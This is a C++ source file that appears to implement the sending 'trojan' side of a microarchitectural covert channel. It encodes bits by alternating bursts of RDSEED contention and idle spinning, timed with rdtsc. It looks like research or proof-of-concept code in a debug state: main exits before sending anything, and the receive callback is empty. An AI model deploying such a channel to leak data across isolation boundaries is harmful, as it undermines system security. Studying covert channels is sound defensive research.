#include "libdd_trojan.hpp"

#define INIT_CONTENTION 50000L
#define PRE_SENDING_CONT 10
#define MAX_LEN 32 // Max length of message that can be sent
#define HALF_PERIOD 680000L
#define RDSEED_SPAM 8

unsigned long long t;
unsigned long long imp_t[10];

inline int rdseed(uint64_t *seed) {
    unsigned char ok;
	asm volatile ("rdseed %0; setc %1": "=r" (*seed), "=qm" (ok));
	return (int)ok;
}

inline void hi() {
    uint64_t u64;
    unsigned long long init = __rdtsc();
    while (__rdtsc() - init < HALF_PERIOD) {
        for (int i = 0; i < RDSEED_SPAM; i++) {
            rdseed(&u64);
        }
    }
}

inline void lo() {
    unsigned long long init = __rdtsc();
    while (__rdtsc() - init < HALF_PERIOD) {
        // spin 
    }
}

// Initialize communication by creating contention
void init_channel() {
    uint64_t u64;
    unsigned long long init = __rdtsc();
    t = init;
    while (__rdtsc() - init < INIT_CONTENTION) {
        for (int i = 0; i < RDSEED_SPAM; i++) {
            rdseed(&u64);
        }
    }
}

// Callback for send
int dd_send(const uint8_t* packet, size_t size) {

    bool* data = (bool*) malloc(size * sizeof(bool));
    bool bit;
    bool temp;
    int idx = 0;
    int flag = false;
    if (size == CHUNK_LEN + CHUNK_ID_LEN) {
        for (int i = 0; i < 16; i++) {
            if (i > 1 && i < 8) continue;
            bit = (packet[i / 8] >> (i % 8)) & 1;
            data[idx] = bit;
            idx++;
        }
        temp = data[0];
        data[0] = data[1];
        data[1] = temp;
    } else {
        flag = true;
        data[0] = 1;
        for (int i = 0; i < size-1; i++) {
            bit = (packet[i / 8] >> (i % 8)) & 1;
            data[i+1] = bit;
        } 
    }

    // before sending a packet
    lo();
    hi();

    // start sending the data
    for (int i = 0; i < size; i++) {
        if(data[i]) {
            hi();
            lo();
        } else {
            lo();
            hi();
        }
    }

    free(data);
    data = NULL;

    return EXIT_SUCCESS;
}


// Callback for recv
int dd_recv(uint8_t* packet, size_t *size, bool fitf) {
    return EXIT_SUCCESS;
}

int main() {

    trojan_sess_t sess;
    char input[MAX_LEN];

    printf("Please type a message\n");
    init_trojan(&sess, &dd_recv, &dd_send);

    while (true) {
        fgets(input, MAX_LEN, stdin);
        unsigned long long int t1 = __rdtsc();
        init_channel();
        unsigned long long int t2 = __rdtsc();
        printf("t1: %llu\n", t1);
        printf("t2: %llu\n", t2);
        printf("t2-t1: %llu\n", t2-t1);
        exit(1);
        send_msg(&sess, input);
    }

    return EXIT_SUCCESS;
}